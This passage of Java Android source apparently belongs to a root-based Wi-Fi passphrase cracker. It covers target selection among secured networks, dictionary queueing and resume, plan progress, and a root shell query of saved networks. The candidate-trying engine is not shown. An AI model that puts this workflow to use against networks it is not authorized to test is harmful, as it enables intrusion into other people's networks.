        // 计划终态（命中/全部跑完/停止）时**不显示**「当前/下一本」——那会让人以为还在跑。
        if (usePlanMode) {
            CrackService svc = liveService();
            io.github.wlmosv_png.wpaforge.audit.DictPlan live = svc == null ? null : svc.planForDisplay();
            if (live != null && !live.items.isEmpty() && !live.state.isTerminal()) {
                io.github.wlmosv_png.wpaforge.audit.DictPlan.Item cur = live.current();
                String next = (live.index + 1 < live.items.size())
                        ? live.items.get(live.index + 1).name : L.s("（最后一本）", "(last)");
                if (sb.length() > 0) sb.append("\n");
                sb.append(L.f("第 %d/%d 本 · 当前「%s」%s · 下一本「%s」 · 整体 %d%%",
                        "#%d of %d · now \"%s\" %s · next \"%s\" · %d%% overall",
                        live.displayIndex(), live.items.size(),
                        cur == null ? "-" : cur.name,
                        cur == null ? "" : (cur.offset + "/" + cur.dictSize),
                        next, Math.round(live.progress() * 100)));
            }
        }
        if (sc + su > 0) {
            if (sb.length() > 0) sb.append("   ·   ");
            sb.append(L.s("跳过 " + (sc + su) + " 条（已证实错误 " + sc
                            + " · 没跑出结果 " + su + "）",
                    "skipped " + (sc + su) + " (" + sc + " proven · " + su + " no result)"));
        }
        planLineView.setText(sb.toString());
        planLineView.setVisibility(sb.length() == 0 ? View.GONE : View.VISIBLE);
    }

    /**
     * 未命中徽章：有「无结论」条目时换成警示色。
     *
     * <p>语义缺口（2026-10-24 最终审计发现）：一次全部无结论的结束也被写成「未命中」，
     * 读起来像"已证实密码不在字典里"。那种结束**没有证据**证明密码错，所以给警示色，
     * 并在卡片正文里注明无结论条数。
     */
    private int badgeBgFor(TaskQueue.Task task) {
        if (task != null && task.state == TaskQueue.State.DONE_MISS
                && task.missInconclusive > 0) {
            return AmberTheme.WARN_BG;
        }
        return badgeBg(task.state);
    }

    private int badgeFgFor(TaskQueue.Task task) {
        if (task != null && task.state == TaskQueue.State.DONE_MISS
                && task.missInconclusive > 0) {
            return ACCENT;
        }
        return badgeFg(task.state);
    }

    /** 未命中且有未证实条目时，卡片正文里那行说明（空串＝不拼这一行）。 */
    private String missCaveat(TaskQueue.Task task) {
        if (task == null || task.state != TaskQueue.State.DONE_MISS
                || task.missInconclusive <= 0) {
            return "";
        }
        return L.f("\n未命中 · 其中 %d 条无结论（未能证实密码错；建议核对环境后重跑）",
                "\nno match · %d inconclusive (not proof of a wrong passphrase)",
                task.missInconclusive);
    }

    private String badgeText(TaskQueue.State st) {
        switch (st) {
            case RUNNING:   return L.s("进行中", "Running");
            case PAUSED:    return L.s("‖ 已暂停", "‖ Paused");
            case PENDING:   return L.s("待处理", "Pending");
            case DONE_HIT:  return L.s("✓ 已破解", "✓ Cracked");
            case DONE_MISS: return L.s("未命中", "No match");
            case STOPPED:   return L.s("已停止", "Stopped");
            default: return "?";
        }
    }

    private int badgeFg(TaskQueue.State st) {
        switch (st) {
            case RUNNING:   return AmberTheme.ON_ACCENT;
            case PAUSED:    return AmberTheme.ON_ACCENT;
            case DONE_HIT:  return AmberTheme.ON_ACCENT;
            case PENDING:   return TEXT_DIM;
            default: return TEXT_DIM;
        }
    }

    private int badgeBg(TaskQueue.State st) {
        switch (st) {
            case RUNNING:   return OK_GREEN;
            case PAUSED:    return AMBER;
            case DONE_HIT:  return OK_GREEN;
            case PENDING:   return AmberTheme.NEUTRAL_BG;
            case DONE_MISS: return AmberTheme.NEUTRAL_BG;
            case STOPPED:   return AmberTheme.DANGER_BG;
            default: return AmberTheme.NEUTRAL_BG;
        }
    }

    private Button smallChip(String label, int color, View.OnClickListener l) {
        Button b = new Button(this);
        b.setText(label);
        b.setAllCaps(false);
        b.setTextSize(AmberTheme.FS_SMALL);
        b.setTextColor(color);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        b.setBackground(roundBg(AmberTheme.CARD_3, AmberTheme.RADIUS_CHIP));
        b.setMinWidth(0); b.setMinimumWidth(0);
        b.setMinHeight(0); b.setMinimumHeight(0);
        b.setStateListAnimator(null);
        b.setPadding(px(14), px(7), px(14), px(7));
        b.setOnClickListener(l);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.rightMargin = px(7);
        b.setLayoutParams(lp);
        return b;
    }

    private void refreshQueue() {
        ui.post(() -> {
            queueCache.clear();
            queueCache.addAll(TaskQueue.load(this));
            renderQueue();
            renderProgressCardState();   // 队列是权威：一更新就重画状态行（见下方说明）
            // 队列是持久化权威：刚读到盘就顺手把「目标/字典」的显示对齐一次
            // （界面被系统重建、服务已不在时，就靠这一步把两张卡补回来）
            restoreSelectionFromAuthority();
            /* **权威一变就必须重画状态行。**
             * 踩过的坑：onTaskDone 里先 renderProgressCardState() 再 refreshQueue()
             * ——渲染那刻 queueCache 还是旧的 RUNNING，而这里更新完缓存却没重画。
             * 结果任务早已 DONE_MISS，状态行却永远停在「运行中 100%」；
             * 用户点「先算了」之后那张卡还挂着"运行中"，像程序没结束。 */
        });
    }

    /** 队列里第一个进行中/待处理的任务 */
    private TaskQueue.Task currentTaskFromQueue() {
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.RUNNING) return t;
        }
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.PENDING) return t;
        }
        return null;
    }

    /** 继续一个暂停的任务 */
    private void resumeTask(TaskQueue.Task task) {
        task.state = TaskQueue.State.PENDING;
        TaskQueue.update(this, task);
        CrackService.start(this);
        refreshQueue();
    }

    /**
     * 网络信息卡的两层。
     *
     * <p>第一层：网络名 + 安全类型胶囊；第二层：信号 · 信道 · 频段。
     * 改版前这两类信息拼在同一个字符串里 —— 长 SSID 会把 dBm/信道/安全类型挤掉，
     * 而且「哪个是名字、哪个是状态」要靠读才知道。
     *
     * <p>数据来源与改版前**完全相同**（{@code targetNet} 的既有字段），
     * 只是分别写进两个 View。
     */
    private void updateTargetLabel() {
        if (connectTargetView == null) return;
        if (targetNet == null) {
            connectTargetView.setText(L.s("未选择目标 —— 点这里选择",
                    "No target — tap to select"));
            connectTargetView.setTextColor(TEXT_DIM);
            if (netSecChip != null) netSecChip.setVisibility(View.GONE);
            if (netMetaView != null) {
                netMetaView.setText(L.s("信号 · 信道 · 频段", "signal · channel · band"));
            }
        } else {
            connectTargetView.setText(targetNet.displayName());
            connectTargetView.setTextColor(TEXT);
            if (netSecChip != null) {
                netSecChip.setText(securityLabel(targetNet.security));
                netSecChip.setVisibility(View.VISIBLE);
            }
            if (netMetaView != null) {
                netMetaView.setText(targetNet.rssi + " dBm"
                        + "   ·   ch" + targetNet.channel
                        + "   ·   " + (targetNet.is5Ghz ? "5 GHz" : "2.4 GHz"));
            }
        }
        updateEmptyHint();
    }

    private void showTargetPicker() {
        if (lastRecords.isEmpty()) {
            Toast.makeText(this, L.s("还没有扫描结果，请先去观测页", "No scan results yet. Go to the Observe tab first."), Toast.LENGTH_SHORT).show();
            return;
        }
        List<String> labels = new ArrayList<>();
        final List<NetRecord> selectable = new ArrayList<>();
        for (NetRecord r : lastRecords) {
            if (r.security == NetRecord.Security.OPEN) continue;
            labels.add(r.displayName() + "  (" + r.rssi + "dBm)");
            selectable.add(r);
        }
        if (selectable.isEmpty()) {
            Toast.makeText(this, L.s("扫描结果里没有加密网络", "No secured networks in the scan results"), Toast.LENGTH_SHORT).show();
            return;
        }
        // 系统 AlertDialog（层级永远正确，不出现「点了没反应」）
        final NetRecord[] arr = selectable.toArray(new NetRecord[0]);
        // 用自研 NetDialog（暗色圆角），跟 App 其它弹窗统一。
        // 这里原来是系统 AlertDialog，白底 Material 风格，很跳。
        io.github.wlmosv_png.wpaforge.ui.NetDialog td =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.f("选择目标（%d 个加密网络）", "Select target (%d secured)",
                                selectable.size()), null);
        for (int i = 0; i < arr.length; i++) {
            final int idx = i;
            td.addItem(labels.get(i), dd -> {
                targetNet = arr[idx];
                Prefs.setTarget(this, targetNet.bssid, targetNet.ssid);
                updateTargetLabel();
                refreshSkippedForCurrentDict();
            });
        }
        td.setNegative(L.s("取消", "Cancel"), null);
        td.show();
    }

    /** 破解开始前记下的原网络 SSID，结束后尝试连回 */
    private String wifiBeforeRun = "";
    private long runStartAt = 0;

    private void rememberCurrentWifi() {
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                    getApplicationContext().getSystemService(android.content.Context.WIFI_SERVICE);
            android.net.wifi.WifiInfo info = wm.getConnectionInfo();
            if (info != null && info.getSSID() != null) {
                String cur = info.getSSID();
                if (cur.startsWith("\"") && cur.endsWith("\"")) {
                    cur = cur.substring(1, cur.length() - 1);
                }
                if (!cur.isEmpty() && !cur.contains("unknown")) wifiBeforeRun = cur;
            }
        } catch (Exception ignored) {}
    }

    /**
     * 破解暂停 / 中止 / 结束之后，把 WiFi 恢复到可用状态。
     *
     * <p>旧实现用 {@code cmd wifi connect-network '<ssid>' wpa2} 去重连原网络 ——
     * **那条命令根本没有密码参数**，系统不会认它。所以「恢复」从来没真正生效过，
     * 用户看到的就是「暂停了 WiFi 还断着」。
     *
     * <p>现在的做法分两步，都不需要我们知道原网络密码：
     * <ol>
     *   <li>把最后一次候选在系统里留下的目标配置删掉 —— 否则系统会拿它再试一次错误密码</li>
     *   <li>重启一次 WiFi，让系统按**已保存的凭据**自己回连</li>
     * </ol>
     */
    /**
     * （R11 起**不再动手**）这里原来是 UI 侧的“善后”：删掉目标配置 + 重启 Wi-Fi。
     *
     * <p>为什么必须停用：它会把**服务刚刚恢复好的原配置再删一次**。
     * 任务收尾的恢复已经统一搬到 {@code CrackService.restoreAfterRun()}，
     * 那是唯一有权改目标配置的地方（它还会读回验证并把结论写进日志）。
     * 两处各删一次的结果是：用户看到“已恢复 WiFi”，实际配置已经被删掉了。
     *
     * <p>保留方法只为兼容既有调用点；行为是**完全不动系统状态**。
     */
    private void restoreWifiAfterRun() {
        // 有意为空：恢复由 CrackService 负责（见其 restoreAfterRun / recoverRestore）。
    }

    private void startConnect() {
        hideResultCard();
        lastRestoreSummary = "";
        finishingNow = false;          // 防上轮异常残留，导致状态一直显示"收尾中"
        ui.removeCallbacks(finishingTick);
        if (candLabel != null) candLabel.setText(L.s("正在尝试", "TRYING"));
        // 跳过是"看不见的行为"，必须在**界面**上说出来。
        // 用户不看日志的话，3000 条的字典只跑 1200 条只会让他以为坏了。
        if (currentDictSkipped > 0) {
            String msg = L.s("这本字典有 " + currentDictSkipped + " 条你已经跑过，会自动跳过（按网络分开记）",
                    currentDictSkipped + " candidates were already tried on this network "
                            + "and will be skipped");
            Toast.makeText(this, msg, Toast.LENGTH_LONG).show();
            appendStream(msg);
        }
        if (targetNet == null) {
            Toast.makeText(this, L.s("请先选择目标网络", "Select a target network first"), Toast.LENGTH_SHORT).show();
            return;
        }
        // 多字典计划模式：字典来自计划，不要求「当前已加载单本字典」。
        // 计划的目标快照在入队时对齐，无需用户再逐本选字典。
        if (!usePlanMode) {
            if (currentDict == null || currentDict.isEmpty()) {
                Toast.makeText(this, L.s("字典为空，请先到审计页加载或生成", "Dictionary is empty — load or generate one in the Audit tab"), Toast.LENGTH_SHORT).show();
                return;
            }
        } else {
            io.github.wlmosv_png.wpaforge.audit.DictPlan p = filePlan();
            if (p == null) {
                Toast.makeText(this, L.s("计划为空，请先到字典管理页建立计划",
                        "Plan is empty — build one in dictionary management first"),
                        Toast.LENGTH_SHORT).show();
                return;
            }
            if (p.state.isTerminal()) {
                Toast.makeText(this, L.s("该目标的计划已结束，请先清理或重选执行方式",
                        "This target's plan already finished — clear it or pick another mode"),
                        Toast.LENGTH_LONG).show();
                return;
            }
        }

        // B 方案：目标被 forget 过（不在系统已保存列表）且本网络有已试记录时，
        // 先提示是否清空已试记录从头开始；确认（或无需处理）后再走真正入队流程。
        // 计划模式的目标来自计划快照，不走这套「单字典目标 forget」提示。
        if (usePlanMode) {
            startConnectAfterGuards();
        } else {
            // 字典续命：先按内容 SHA 找历史进度（异步算 SHA，避免大字典卡主线程）。
            maybeOfferResumeThenStart();
        }
    }

    /**
     * 字典续命检查：按**内容身份**（SHA-256）找同一目标上的历史进度。
     *
     * <ul>
     *   <li>内容相同（无论路径是否变）→ 提示「可续命继续」，用户可选续命或从头；</li>
     *   <li>同路径但内容变了 → 明确提示「不继承旧进度」，从第 1 条重跑；</li>
     *   <li>没有历史 → 直接开始。</li>
     * </ul>
     * 续命只影响**本次任务的起始 offset**；过滤账本按目标自动沿用（同一套语义）。
     */
    private void maybeOfferResumeThenStart() {
        pendingResumeOffset = 0;
        pendingDictSha = "";
        final String path = currentDictPath == null ? "" : currentDictPath;
        final String targetKey = currentTargetKey();
        if (path.isEmpty()) {
            maybeOfferClearTriedIfForgotten(this::startConnectAfterGuards);
            return;
        }
        new Thread(() -> {
            String sha = "";
            try {
                sha = io.github.wlmosv_png.wpaforge.audit.DictPlan.sha256Of(new java.io.File(path));
            } catch (Throwable ignored) {}
            final String fsha = sha;
            final int curSize = currentDict == null ? 0 : currentDict.size();
            io.github.wlmosv_png.wpaforge.audit.DictResume.Info info =
                    io.github.wlmosv_png.wpaforge.audit.DictResume.find(
                            TaskQueue.load(this), filePlan(), targetKey, fsha, path);
            final int off = io.github.wlmosv_png.wpaforge.audit.DictResume.offsetFor(info, curSize);
            ui.post(() -> {
                pendingDictSha = fsha;
                if (info.contentChanged) {
                    // 内容变了 —— 不继承，且必须明确告诉用户
                    NetDialog d = new NetDialog(this,
                            L.s("字典内容已变化", "Dictionary content changed"),
                            L.s("这本字典的内容和上次不同（路径相同）。\n"
                                    + "为避免把旧进度套到新内容上，这次从第 1 条重新开始。",
                                    "This dictionary's content differs from last time (same path).\n"
                                            + "To avoid applying old progress to new content, "
                                            + "it restarts from entry 1."));
                    d.setNegative(L.s("知道了", "Got it"), null);
                    d.setPositive(L.s("开始", "Start"),
                            dd -> maybeOfferClearTriedIfForgotten(this::startConnectAfterGuards));
                    d.show();
                    return;
                }
                if (off > 0) {
                    NetDialog d = new NetDialog(this,
                            L.s("可以续命继续", "Resume available"),
                            io.github.wlmosv_png.wpaforge.audit.DictResume.describe(info, curSize)
                                    + L.s("。\n\n续命会沿用原目标的过滤记录（不会重复跑已验证过的候选）。",
                                    ".\n\nResuming reuses this target's filter history "
                                            + "(verified candidates are not retried)."));
                    d.setNegative(L.s("从头开始", "Start over"), dd -> {
                        pendingResumeOffset = 0;
                        maybeOfferClearTriedIfForgotten(this::startConnectAfterGuards);
                    });
                    d.setPositive(L.s("续命继续", "Resume"), dd -> {
                        pendingResumeOffset = off;
                        maybeOfferClearTriedIfForgotten(this::startConnectAfterGuards);
                    });
                    d.show();
                    return;
                }
                maybeOfferClearTriedIfForgotten(this::startConnectAfterGuards);
            });
        }, "wpaforge-resume-probe").start();
    }

    /**
     * startConnect 的入队后半段：守卫全部通过后执行。
     *
     * <p>从 startConnect 拆出来，是为了让「检测目标是否被 forget」这个异步步骤
     * 能在入队前完成——否则检测结果还没回来，任务就已经入队开跑了。
     */
    private void startConnectAfterGuards() {
        // 只有 Root 一条通道
        final int mode = Prefs.mode(this);
        RootProber.CheckResult chk = RootProber.check(this);
        if (!chk.ok) {
            connectStreamView.setText("");
            appendStreamColored(L.f("无法开始: %s", "Cannot start: %s", chk.title), DANGER);
            NetDialog d = new NetDialog(this, chk.title, chk.detail);
            d.setNegative(L.s("知道了", "Got it"), null);
            d.show();
            return;
        }

        // 耗时预估：按实测速度算，比固定假设准
        {
            int planned = (currentDict == null || currentDict.isEmpty())
                    ? 0 : currentDict.size();
            String est = Prefs.estimate(this, planned);
            String rate = Prefs.avgRateLabel(this);
            boolean sampled = Prefs.hasRateSample(this);
            appendStream(L.f("模式 %s · 字典 %d 条 · 预计 %s（%s %s 条/秒）",
                    "Mode %s · %d entries · est. %s (%s %s/s)",
                    Prefs.modeLabel(this), planned, est,
                    sampled ? L.s("实测", "measured") : L.s("默认", "default"), rate));
        }

        // 新的一轮：清掉上一轮的候选窗口与命中卡片，别让旧结果看着像新的
        resetCrackHud();

        // 记下原网络，跑完连回去
        rememberCurrentWifi();

        // 如果当前用的是内置生成器（没有落盘文件），**入队前先落地**。
        //
        // 为什么必须这么做：服务进程只认 dictPath。
        // path 为空时它无法重建候选，只能走「候选为空，跳过」——
        // 用户看到的「三种模式点开始都秒结束」就是这个。
        // 落盘后 path 有值，服务端行为与界面显示完全一致，不再依赖
        // 「运行时用同样参数重建」这种脆弱假设。
        if (currentDictPath == null || currentDictPath.isEmpty()) {
            try {
                currentDictPath = persistGeneratedDict();
            } catch (Throwable t) {
                appendStreamColored(L.s("内置字典落地失败: ", "Failed to save generated dictionary: ")
                        + t.getClass().getSimpleName(), DANGER);
            }
        }

        // 入队。crackService 可能还没绑定好（bindService 是异步的），
        // 所以先直接写持久化队列，不依赖服务实例 —— 避免 NPE。
        //
        // 多字典计划模式：不逐本选字典。入队的任务用**计划的目标快照**与
        // **计划当前指向的那本字典**，让服务端既有的 loadPlanForRun 干净接管
        // （目标一致 + 计划未终态 + 计划有成员），之后按计划顺序自动接力。
        final io.github.wlmosv_png.wpaforge.audit.DictPlan planForStart =
                usePlanMode ? filePlan() : null;
        if (planForStart != null && !planForStart.items.isEmpty()
                && !planForStart.state.isTerminal()) {
            final io.github.wlmosv_png.wpaforge.audit.DictPlan sp = planForStart;
            selectedPlan = sp;
            // 计划自带目标快照时用它（bssid/ssid 与计划 targetKey 同源，服务端
            // loadPlanForRun 的目标一致性检查自然通过）；计划还没绑定目标时退回
            // 破解页当前选中的目标 —— 第一次跑计划就是这种情况。
            final io.github.wlmosv_png.wpaforge.core.NetRecord planTarget =
                    (sp.targetBssid != null && !sp.targetBssid.isEmpty())
                            ? sp.toNetRecord() : targetNet;
            io.github.wlmosv_png.wpaforge.audit.DictPlan.Item cur = sp.current();
            final String planDictPath = cur == null || cur.path.isEmpty() ? "" : cur.path;
            final String planDictName = cur == null || cur.name.isEmpty() ? L.s("计划字典", "Plan dictionary") : cur.name;
            // 用 enqueuePlan 标记「来源=计划」：执行侧据此让计划接管，
            // 而不是把这条当成用户单字典任务。
            final TaskQueue.Task t = TaskQueue.enqueuePlan(this, planTarget,
                    planDictPath, planDictName, Prefs.mode(this));
            if (t != null && cur != null && cur.sha256 != null && !cur.sha256.isEmpty()
                    && !cur.sha256.equals(t.dictSha)) {
                t.dictSha = cur.sha256;
                TaskQueue.update(this, t);
            }
            queueCache.clear();
            queueCache.addAll(TaskQueue.load(this));
            renderQueue();

            appendStream(L.s("已加入队列: ", "Added to queue: ") + planTarget.displayName()
                    + L.s("   多字典计划 ", "   plan ") + sp.items.size()
                    + L.s(" 本 · 从「", " dictionaries · from \"") + planDictName
                    + L.s("」开始自动接力", "\" auto-relaying"));
        } else {
            final TaskQueue.Task t = TaskQueue.enqueue(this, targetNet,
                    currentDictPath, currentDictName,
                    targetDictEnabled, smartSortEnabled, Prefs.mode(this),
                    profileForCurrentTarget().seeds.encode());
            // 续命：继承内容身份与历史 offset（若用户选择续命）
            boolean touched = false;
            if (pendingDictSha != null && !pendingDictSha.isEmpty()
                    && !pendingDictSha.equals(t.dictSha)) {
                t.dictSha = pendingDictSha; touched = true;
            }
            if (pendingResumeOffset > 0 && t.offset < pendingResumeOffset) {
                t.offset = pendingResumeOffset; touched = true;
            }
            if (touched) TaskQueue.update(this, t);
            if (pendingResumeOffset > 0) {
                appendStream(L.s("续命：从第 ", "Resume: from entry ") + pendingResumeOffset
                        + L.s(" 条继续（沿用原目标过滤记录）",
                              " (reusing this target's filter history)"));
            }
            pendingResumeOffset = 0;
            queueCache.clear();
            queueCache.addAll(TaskQueue.load(this));
            renderQueue();

            appendStream(L.s("已加入队列: ", "Added to queue: ") + targetNet.displayName()
                    + L.s("   字典 ", "   dictionary ") + currentDictName + "（" + currentDict.size() + L.s(" 条）", " entries)"));
        }
        if (smartSortEnabled) appendStream(L.s("智能排序: 开", "Smart ranking: on"));
        if (targetDictEnabled) appendStream(L.s("目标派生: 开", "Target derivation: on"));
        appendStream(L.s("破解在后台进行，可以切走或锁屏。通知栏能看到进度。", "Cracking runs in the background — you can switch away or lock the screen. Progress shows in the notification."));

        // 启动前台服务（服务自己会读队列并开跑）
        CrackService.start(this);

        // 绑定还没完成时，稍后再同步一次状态
        setRunning(true);
        for (long delay : new long[]{300, 900, 1800}) {
            ui.postDelayed(() -> {
                if (crackService != null) {
                    setRunning(crackService.isWorking());
                    refreshQueue();
                }
            }, delay);
        }
    }

    /**
     * B 方案：目标被 forget（不在系统已保存列表）且本网络有已试记录时，
     * 提示是否清空已试记录从头开始。
     *
     * <p>背景：已试记录（TriedSet）按目标分开、永久保存，与「系统 forget 网络」
     * 完全解耦。用户 forget WiFi 后想重测，已试记录还在，续跑会跳过之前跑过的
     * 密码——若历史版本把正确密码误判成「密码错误」，它已被记进已试集合，
     * 续跑就永久跳过它。这里在入队前主动检测：目标若已不在系统已保存列表，
     * 说明用户大概率 forget 过，给一次「从头重跑」的选择。
     *
     * <p>只在「目标确实 forget 且已试记录非空」时弹；不静默清，也绝不误清
     * （目标还在已保存列表 = 正常续跑，不弹）。
     *
     * @param proceed 检测完成、无需处理（或用户已处理）后继续入队的回调
     */
    private void maybeOfferClearTriedIfForgotten(final Runnable proceed) {
        if (targetNet == null) { proceed.run(); return; }
        final io.github.wlmosv_png.wpaforge.audit.TriedSet tried = triedForCurrentTarget();
        // 没有已试记录，无所谓清不清，直接继续
        if (tried == null || tried.size() == 0) { proceed.run(); return; }

        new Thread(() -> {
            try {
                // 只读检测：目标是否还在系统「已保存网络」列表里
                io.github.wlmosv_png.wpaforge.audit.CrackEngine.ShellChannel sh =
                        new io.github.wlmosv_png.wpaforge.audit.CrackEngine.ShellChannel() {
                            @Override public String exec(String cmd, long timeoutMs) {
                                return io.github.wlmosv_png.wpaforge.audit.RootProber
                                        .exec(null, new String[]{"su", "-c", cmd}, timeoutMs);
                            }
                            @Override public String name() { return "Root"; }
                        };
                String out = sh.exec("cmd wifi list-networks", 5000);
                long id = io.github.wlmosv_png.wpaforge.audit.ListNetworksParser
                        .findNetId(out, targetNet.ssid);
                if (id >= 0) {
                    // 目标还在已保存列表 → 正常续跑，不打扰
                    ui.post(proceed);
                    return;
                }
                // 目标已被 forget，但本网络仍有已试记录 → 询问是否清空
                ui.post(() -> {
                    NetDialog d = new NetDialog(this,
                            L.s("这个网络似乎已被删除/忘记", "This network looks forgotten"),
                            L.s("本网络还记着 ", "This network still has ")
                                    + tried.size()
                                    + L.s(" 条已试记录。\n\n系统里已经找不到这个网络的配置，"
                                          + "可能你已经忘记（删除）了它。\n\n"
                                          + "要继续的话，是否先清空已试记录、从头重新跑？\n"
                                          + "（不清空：之前跑过的密码会被自动跳过）",
                                    " tried records.\n\nIts config is no longer in the system "
                                          + "saved list — you may have forgotten it.\n\n"
                                          + "Clear the tried record and restart from scratch?\n"
                                          + "(if not: already-tried passwords stay skipped)"));
                    d.setDanger(L.s("清空并重新跑", "Clear and restart"), dd -> {
                        boolean ok = io.github.wlmosv_png.wpaforge.audit.TriedSet
                                .deleteFor(this, currentTargetKey());
                        Toast.makeText(this,
                                ok ? L.s("已清空，从头开始", "Cleared, starting fresh")
                                   : L.s("清空失败，仍按原记录继续", "Clear failed, continuing as-is"),
                                Toast.LENGTH_SHORT).show();
                        proceed.run();
                    });
                    d.setNegative(L.s("不清空，继续", "Keep and continue"), dd -> proceed.run());
                    d.show();
                });
            } catch (Throwable t) {
                // 检测失败（shell 不可用等）→ 不阻塞，按原逻辑继续
                ui.post(proceed);
            }
        }, "wpaforge-forgot-check").start();
    }

    /** 秒数转成人话 */
    private static String humanTime(long sec) {
        if (sec < 60) return L.f("%d 秒", "%ds", sec);
        if (sec < 3600) return L.f("%d 分钟", "%d min", sec / 60);
        if (sec < 86400) return (sec / 3600) + " 小时 " + ((sec % 3600) / 60) + " 分钟";
        return (sec / 86400) + " 天 " + ((sec % 86400) / 3600) + " 小时";
    }

    private String formatDuration(long ms) {
        long s = ms / 1000;
        if (s < 60) return s + " 秒";
        long m = s / 60;
        if (m < 60) return m + L.f(" 分 %s 秒", "m %s s", (s % 60));
        return (m / 60) + " 小时 " + (m % 60) + " 分";
    }

    /** 反转候选流的折叠状态 */
    private void toggleStream() {
        streamCollapsed = !streamCollapsed;
        applyStreamHeight();
        updateFlowHeader();
        // 切换后**回到最新**：折叠态只有几行高度，若停在中间会看到一段
        // 与当下无关的旧内容（用户报的「文字残留」观感来源之一）。
        streamAutoScroll = true;
        if (streamScroll != null) {
            streamScroll.post(() -> streamScroll.fullScroll(android.view.View.FOCUS_DOWN));
        }
        updateJumpLatest();
    }

    /** 折叠时只留几行；展开时约 240dp。高度作用在 ScrollView 上。 */
    private void applyStreamHeight() {
        if (connectStreamView == null || streamParams == null) return;
        // 没有可见日志时整块收起 —— 空闲状态由引导文案负责，不留空白区。
        boolean empty = streamBuffer.length() == 0;
        if (empty) {
            streamParams.height = 0;
            streamParams.weight = 0f;
        } else {
            streamParams.height = px(streamCollapsed ? STREAM_COLLAPSED_DP : STREAM_EXPANDED_DP);
            streamParams.weight = 0f;
        }
        /*
         * **不再给 TextView 设 maxLines / ellipsize。**
         *
         * 用户实测（2026-11-02）两件事都由它引起：
         *   ① 「小窗里滚不动」—— maxLines=4 + ellipsize=END 把 TextView 压成
         *      恰好 4 行高，ScrollView 里没有可滚内容，手势等于白滑；
         *   ② 「文字残留」—— 被裁掉的是**尾部**，所以小窗永远显示日志开头的
         *      几行（任务启动时的保活提示），后面的判定结论一条都看不到。
         *
         * 现在高度只由**容器**决定，TextView 完整渲染；由 ScrollView 负责滚动、
         * 由 streamAutoScroll 负责自动跟到底部。于是：
         *   · 小窗能看到**最新**几行；
         *   · 手指在小窗里可以往上滑看历史；
         *   · 原始证据一条都没裁掉。
         */
        if (connectStreamView != null) {
            connectStreamView.setMaxLines(Integer.MAX_VALUE);
            connectStreamView.setEllipsize(null);
        }
        // 高度加在**外层 wrap** 上（它挂在 LinearLayout 里，用 LinearLayout 参数），
        // streamScroll 在 FrameLayout 里始终 MATCH_PARENT 铺满。
        //
        // 踩过的坑：直接给 streamScroll 设 LinearLayout 参数，会因为
        // 它此刻的父容器是 FrameLayout 而抛 ClassCastException（测量期崩）。
        if (streamWrapView != null) {
            streamWrapView.setLayoutParams(streamParams);
            streamWrapView.setVisibility(empty ? View.GONE : View.VISIBLE);
        }
    }

    /**
     * 刷新「回到最新」按钮的可见性。
     *
     * 只在「用户在翻历史」且「底部确实有新内容」时露出。
     * 已经在底部就不显示 —— 没用的按钮只会挡视线。
     */
    private void updateJumpLatest() {
        if (jumpLatestBtn == null || streamScroll == null) return;
        android.view.View child = streamScroll.getChildAt(0);
        if (child == null) {
            jumpLatestBtn.setVisibility(View.GONE);
            return;
        }
        int bottom = streamScroll.getScrollY() + streamScroll.getHeight();
        boolean atBottom = bottom >= child.getMeasuredHeight() - px(24);
        // 自动跟随开着的时候也不需要它
        boolean show = !atBottom && !streamAutoScroll;
        jumpLatestBtn.setVisibility(show ? View.VISIBLE : View.GONE);
    }

    /** 刷新头部箭头与行数 */
    private void updateFlowHeader() {
        if (flowChevron != null) {
            // 折叠指示沿用最通用的语义（文件管理器 / 设置页都这样）：
            //   折叠 -> ▶ 朝右（"里面还有内容，点开"）
            //   展开 -> ▼ 朝下（"已经展开到这里了"）
            // 上一版用 ▼/▲ 朝上朝下，折叠态朝下很容易被读成"已经展开了"。
            flowChevron.setText(streamCollapsed ? "▶" : "▼");
            // 无障碍：读屏用户也要知道这个按钮干什么
            flowChevron.setContentDescription(streamCollapsed
                    ? L.s("展开日志", "Expand log") : L.s("收起日志", "Collapse log"));
        }
        if (flowCount != null) {
            int shown = 0;
            for (int i = 0; i < streamBuffer.length(); i++) {
                if (streamBuffer.charAt(i) == '\n') shown++;
            }
            int all = streamLines.size();
            if (shown <= 0) {
                flowCount.setText("");
            } else if (streamKeyOnly && all > shown) {
                // 缩在「关键」时把总量也报出来，用户知道还有多少被折叠着
                flowCount.setText(L.f("%d / %d 行", "%d / %d", shown, all));
            } else {
                flowCount.setText(L.f("%d 行", "%d lines", shown));
            }
        }
    }

    private void appendStream(String line) {
        appendStreamColored(line, TEXT_DIM);
    }

    /**
     * 往日志区追加一行。**每行带自己的颜色**。
     *
     * 旧实现是 streamBuffer.append(line) 之后
     * connectStreamView.setTextColor(最后一行颜色) —— 而那个 TextView
     * 承载整段文本，等于每次追加都把**整个日志区**染成最后一行的颜色。
     * 用户看到的「显示不好」就是这个（历史行的颜色不停被抹掉）。
     *
     * 现在每行 append 时打上自己的 ForegroundColorSpan，互不干扰。
     *
     * @param line  行内容（null 直接忽略）
     * @param color 这一行的颜色；为 0 时用默认灰
     */
    /**
     * 日志的一行（全量留存，含被当前筛选挡住的）。
     *
     * <p>改版前只有 {@code streamBuffer} 一个 Spannable —— 行是「写进去就没法再筛」的。
     * 现在留一份结构化副本：筛「关键 / 全部」时从它重建即可，
     * 顺便把原来那段「找截断点、逐 span 删除」的脆弱代码换成列表裁剪。
     */
    private static final class LogLine {
        final CharSequence text;
        final int color;
        final io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind kind;
        /**
         * 降噪合并键（P1b）。{@code null} 表示这一行不参与合并。
         *
         * <p>逐条候选结果里同一类结论会连续出现几十次（真机实测：错误密码下
         * 系统不断回连其它网络 → 每条都是「未证实」）。旧实现每条追加两行
         * （主行 + 说明），日志区被同一句话刷满，真正的信息反而看不见。
         * 相同键的相邻行会合并成一行并显示 {@code ×N}。
         */
        final String dedupeKey;
        /** 已合并的条数（1 = 只有本行）。 */
        final int repeat;
        /**
         * **技术详情版文本**（2026-11-02 收口：日志分两层）。
         *
